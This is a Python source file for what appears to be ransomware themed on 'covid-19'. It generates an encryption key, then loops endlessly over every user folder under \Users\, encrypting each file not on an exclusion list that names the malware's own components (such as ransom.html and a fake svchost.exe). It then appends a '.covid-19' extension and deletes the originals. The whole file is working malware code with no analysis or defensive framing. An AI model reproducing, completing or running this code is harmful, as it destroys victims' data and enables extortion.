#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, base64

""" THIS FILE IS PART OF THE FINAL EXECUTABLES """

# GET THE ENVIRONMENT VARIABLE
letter_drive = os.environ["SystemDrive"]
current_user = os.environ["USERNAME"]

# PATH TO WRITE THE NEW KEY AFTER REBOOT
usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive, current_user, current_user)

# GENERATE KEY FUNCTION
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)

# FILE ENCYPTING FUNCTION
def file_encrypt(key, name):
    with open(name,'rb') as files:
        data = files.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    encrypted_file = name + ".covid-19"
    try:
        with open(encrypted_file, 'wb') as files:
            files.write(encrypted)

        os.remove(name)
    except:
        pass

# CALL FUNCTION TO GENERATE KEY
genkey(current_user)

# FOR EVERYTIME ENCRYPTING FILES
while True:
    # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
    rep = ['\\Users\\']
    for user in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                if not(file in my_files):
                    for ext in file.split("."):
                        if(file.endswith(ext)):
                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
                            if not(ext in my_ext):
                                try:
                                    ally = os.path.join(root, file)
                                    file_encrypt(key, ally)
                                except PermissionError:
                                    pass
                                except:
                                    pass
